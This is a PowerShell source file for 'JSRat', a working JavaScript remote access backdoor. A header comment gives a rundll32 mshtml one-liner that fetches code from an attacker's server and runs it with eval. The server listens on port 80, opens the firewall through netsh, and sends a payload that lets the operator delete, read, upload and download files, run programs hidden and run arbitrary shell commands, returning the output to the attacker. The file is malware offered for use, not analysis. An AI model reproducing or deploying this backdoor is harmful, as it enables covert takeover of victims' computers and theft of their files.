<#
  ---
  Javascript Backdoor
  ---
  Server - cmd line run as admin:
    powershell -ExecutionPolicy RemoteSigned -File c:\test\JSRat.ps1
  
  Client - cmd line:
  rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WinHttp.WinHttpRequest.5.1");w=new%20ActiveXObject("WScript.Shell");try{v=w.RegRead("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet%20Settings\\ProxyServer");q=v.split("=")[1].split(";")[0];h.SetProxy(2,q);}catch(e){}h.Open("GET","http://192.168.1.2/connect",false);try{h.Send();B=h.ResponseText;eval(B);}catch(e){new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im rundll32.exe",0,true);}
#>

# This script can not normally display Chinese

$Server = '192.168.1.2' # Listening IP.

function Receive-Request
{
	param
	(      
		$Request
	)
	$output = ""
	$size = $Request.ContentLength64 + 1   
	$buffer = New-Object byte[] $size
	do
	{
		$count = $Request.InputStream.Read($buffer, 0, $size)
		$output += $Request.ContentEncoding.GetString($buffer, 0, $count)
	} until($count -lt $size) # -lt : less than
	$Request.InputStream.Close()
	write-host $output
}

$listener = New-Object System.Net.HttpListener
$listener.Prefixes.Add('http://+:80/') 

netsh advfirewall firewall delete rule name="PoshRat 80" | Out-Null
netsh advfirewall firewall add rule name="PoshRat 80" dir=in action=allow protocol=TCP localport=80 | Out-Null

$listener.Start()
write-host 'Listening ...' -fore Cyan

while ($true) 
{
	$context = $listener.GetContext() # blocks until request is received
	$request = $context.Request
	$response = $context.Response
	$hostip = $request.RemoteEndPoint

	# Use this for One-Liner Start
	if ($request.Url -match '/connect$' -and ($request.HttpMethod -eq "GET")) 
	{
		# use -fore for font-color
		write-host "Usage:" -fore Green
		write-host "    exit backdoor:  exit" -fore Green
		write-host "    delete file:    del <filepath>" -fore Green
		write-host "    create file:    create <filepath>" -fore Green
		write-host "    read file:      read <filepath>" -fore Green
		write-host "    run exe:        run <filepath>" -fore Green
		write-host "    cmd:            just input the cmd command" -fore Green
		write-host "    download file:  download -from <filepath> -to <filepath>" -fore Green
		write-host "    upload file:    upload -from <filepath> -to <filepath>" -fore Green
		write-host "Host Connected" -fore Cyan
		$message = '
			forReading = 1;
			forWriting = 2;
			forAppending = 8;
			
			fso1 = new ActiveXObject("Scripting.FileSystemObject");
			tempFolder = fso1.GetSpecialFolder(2);
			tempFile = tempFolder+"\\test.txt";
			
			while(true)
			{
				h = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
				h.SetTimeouts(0, 0, 0, 0);
				
				try
				{
					h.Open("GET","http://'+$Server+'/rat",false);
					h.Send();
					c = h.ResponseText;
					
					if(c=="exit")
					{
						c="cmd /c taskkill /f /im rundll32.exe";
						r = new ActiveXObject("WScript.Shell").Run(c, 0, false);
						
						p = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
						p.SetTimeouts(0, 0, 0, 0);
						p.Open("POST","http://'+$Server+'/rat",false);
						p.Send("Exiting...");
					}
					else if(c.substring(0,4)=="del ")
					{
						f =fso1.GetFile(c.substring(4));
						f.Delete();
						
						p=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
						p.SetTimeouts(0, 0, 0, 0);
						p.Open("POST","http://'+$Server+'/rat",false);
						p.Send("Success\n");
						
						continue;						 
					}
					else if(c.substring(0,7)=="create ")
					{
						//f = fso1.CreateTextFile(c.substring(7), true);
						f = fso1.OpenTextFile(c.substring(7), forWriting, true);
						f.Close();
						
						note = "the second pram decide whether to cover if exist. we can use f.Write(string), f.WriteLine(string), f.WriteBlankLines(int)";
						
						p=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
						p.SetTimeouts(0, 0, 0, 0);
						p.Open("POST","http://'+$Server+'/rat",false);
						p.Send("Success\n");
						
						continue;						 
					}
					else if(c.substring(0,5)=="read ")
					{
						f=fso1.OpenTextFile(c.substring(5), forReading, false);
						text=f.ReadAll();
						f.Close();
						
						p=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
						p.SetTimeouts(0, 0, 0, 0);
						p.Open("POST","http://'+$Server+'/rat",false);
						p.Send(text);
						
						continue;
					}
					else if(c.substring(0,9) == "download ")
					{
						index1 = c.indexOf(" -from ");
						index2 = c.indexOf(" -to ");
						if(index1 == -1 || index1 >= index2) {
							p = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
							p.SetTimeouts(0, 0, 0, 0);
							p.Open("POST", "http://'+$Server+'/rat", false);
							p.Send("Usage: download -from <filepath> -to <filepath>\n");
							continue;
						}
						
						frompath = c.substring(index1 + 7, index2);
						topath = c.substring(index2 + 5);
						
						f = fso1.OpenTextFile(frompath, forReading);
						filedata = f.ReadAll();
						f.Close(); 
						
						p = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
						p.SetTimeouts(0, 0, 0, 0);
						p.Open("POST", "http://'+$Server+'/download", false);
						p.Send(topath + "->" + filedata);
						
						continue;
					}
					else if(c.substring(0,7) == "upload ")
					{
						index1 = c.indexOf(" -from ");
						index2 = c.indexOf(" -to ");
						if(index1 == -1 || index1 >= index2) {
							p = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
							p.SetTimeouts(0, 0, 0, 0);
							p.Open("POST", "http://'+$Server+'/rat", false);
							p.Send("Usage: upload -from <filepath> -to <filepath>\n");
							continue;
						}
						
						frompath = c.substring(index1 + 7, index2);
						topath = c.substring(index2 + 5);
						
						g = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
						g.SetTimeouts(0, 0, 0, 0);
						g.Open("GET", "http://'+$Server+'/upload", false);
						g.Send(frompath);
						filedata = g.ResponseText;
						
						f = fso1.OpenTextFile(topath, forWriting, true);
						f.Write(filedata);
						f.Close();
						
						p = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
						p.SetTimeouts(0, 0, 0, 0);
						p.Open("POST", "http://'+$Server+'/rat", false);
						p.Send("Success\n");
						
						continue;
					}
					else if(c.substring(0,4) == "run ")
					{
						showWindow = 1;
						while(c.indexOf(" -hide") != -1) {
							c = c.replace(" -hide", "");
							showWindow = 0;
						}
						new ActiveXObject("WScript.Shell").Run(c.substring(4), showWindow, false);
						
						p=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
						p.SetTimeouts(0, 0, 0, 0);
						p.Open("POST","http://'+$Server+'/rat",false);
						p.Send("Success\n");
						
						continue;
					}
					else
					{
						//var res;
						//r = new ActiveXObject("WScript.Shell").Exec(c); //will show a CMD Window
						//while(!r.StdOut.AtEndOfStream){ res = r.StdOut.ReadAll() }
						
						f = fso1.CreateTextFile(tempFile, forWriting, true);
						f.Write("");
						f.Close();
						
						new ActiveXObject("WScript.Shell").Run("cmd /c "+c+" >"+tempFile,0,true);
						//if c is not an auto-closed.exe, here will be block. 
						
						f = fso1.OpenTextFile(tempFile, forReading);
						res = f.ReadAll();
						f.Close();
						
						p = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
						p.SetTimeouts(0, 0, 0, 0);
						p.Open("POST","http://'+$Server+'/rat", false);
						p.Send(res);
					}
				}
				catch(e1)
				{
					var err = e1.name + ": ";
					
					var browserType = navigator.appName;
					if (browserType.indexOf("I")!=-1 && browserType.indexOf("E")!=-1) {
						info = e1.description;
						err = err + (e1.number & 0xFFFF) + (info?" | "+info:"\n");
						if(info && info.indexOf("\n")==-1) err = err + "\n";
					}
					else {
						err = err + (e1.fileName?e1.fileName+" | ":"") + e1.message;
					}
					
					p=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
					p.SetTimeouts(0, 0, 0, 0);
					p.Open("POST","http://'+$Server+'/rat",false);
					p.Send(err);
				}
			}
		'
	}
	
	if ($request.Url -match '/rat$' -and ($request.HttpMethod -eq "POST") ) 
	{ 
		Receive-Request($request)   
	}
    
	if ($request.Url -match '/rat$' -and ($request.HttpMethod -eq "GET")) 
	{  
		$response.ContentType = 'text/plain'
		$message = Read-Host "JS $hostip>"
	}
	
	if($BoolExit -eq 1)
	{
		exit
	}
    $BoolExit=0
	
	if($message  -eq "exit")
	{
		$BoolExit=1
	}
	
	if ($request.Url -match '/download$' -and ($request.HttpMethod -eq "POST") ) 
	{ 
		$output = ""
		$size = $Request.ContentLength64 + 1   
		$buffer = New-Object byte[] $size
		do
		{
			$count = $Request.InputStream.Read($buffer, 0, $size)
			$output += $Request.ContentEncoding.GetString($buffer, 0, $count)
		} until($count -lt $size)
		$Request.InputStream.Close()
		
		$index = $output.indexOf("->")
		$savePath = $output.substring(0,$index)
		$filedata = $output.substring($index+2)
		
		Set-Content $savePath -Value $filedata
		write-host "Success"
		write-host ""
	}
	
	if ($request.Url -match '/upload$' -and ($request.HttpMethod -eq "GET") ) 
	{
		$output = ""
		$size = $Request.ContentLength64 + 1   
		$buffer = New-Object byte[] $size
		do
		{
			$count = $Request.InputStream.Read($buffer, 0, $size)
			$output += $Request.ContentEncoding.GetString($buffer, 0, $count)
		} until($count -lt $size)
		$Request.InputStream.Close()
		
		$message = Get-Content $output
	}
	
	[byte[]] $buffer = [System.Text.Encoding]::UTF8.GetBytes($message)
	$response.ContentLength64 = $buffer.length
	$output = $response.OutputStream
	$output.Write($buffer, 0, $buffer.length)
	$output.Close() 
}

$listener.Stop()
